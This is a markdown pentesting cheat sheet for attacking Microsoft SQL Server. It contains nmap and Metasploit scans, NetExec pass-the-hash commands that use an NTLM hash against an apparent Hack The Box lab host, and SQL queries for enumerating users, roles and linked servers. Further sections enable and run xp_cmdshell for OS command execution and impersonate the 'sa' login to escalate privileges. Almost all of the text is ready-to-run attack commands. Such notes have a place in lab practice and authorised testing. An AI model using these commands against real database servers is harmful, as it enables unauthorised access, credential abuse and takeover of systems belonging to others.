## Automated Enumeration
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

```
msf> use auxiliary/scanner/mssql/mssql_ping
```
## NXC
```
nxc mssql ghost.htb  -u "adfs_gmsa\$" -H "55eea5db159b96bcb1d335d6e5738ea6"
```
In this case we are doing a pass the hash (pth).
### PrivEsc
```
nxc mssql ghost.htb  -u "adfs_gmsa\$" -H "55eea5db159b96bcb1d335d6e5738ea6" -M mssql_priv
```
## Common Enumeration
Get Version
```
select @@version;
```
Get databases
```
SELECT name FROM master.dbo.sysdatabases;
```

Get machine name
```
SELECT @@SERVERNAME;
```

### Database Enumeration
List all databases
```
SELECT name from sys.databases;
```
```
SELECT name FROM master.dbo.sysdatabases;
```
Current database
```
SELECT DB_NAME();
```

### User Enumeration
Current User
```
SELECT USER_NAME();
```

```
SELECT SYSTEM_USER;
```

User Privileges
```
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

List sysadmin users
```
SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
```

### Privilege Enumeration
Check if current user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Check server roles
```
SELECT name FROM master.sys.server_principals WHERE type = 'R';
```

Current user permissions
```
EXEC sp_helprotect;
```

Database role members
```
EXEC sp_helprolemember;
```

### Linked Server Enumeration
List linked servers
```
EXEC sp_linkedservers;
```

```
SELECT * FROM sys.servers;
```

Test linked server connection
```
SELECT * FROM OPENQUERY([PRIMARY], 'SELECT @@version');
```

Execute on linked server
```
EXEC ('SELECT @@version') AT [PRIMARY];
```

## Command Execution
### Enabling xp_cmdshell
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
### Command Execution
```
EXEC xp_cmdshell 'whoami';
```

```
EXEC master..xp_cmdshell 'ipconfig';
```
## Privilege Escalation
### Impersonation Attacks
```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

Impersonate sysadmin
```
EXECUTE AS LOGIN = 'sa';  
SELECT SYSTEM_USER;  
SELECT IS_SRVROLEMEMBER('sysadmin');
```
### References
https://hackviser.com/tactics/pentesting/services/mssql

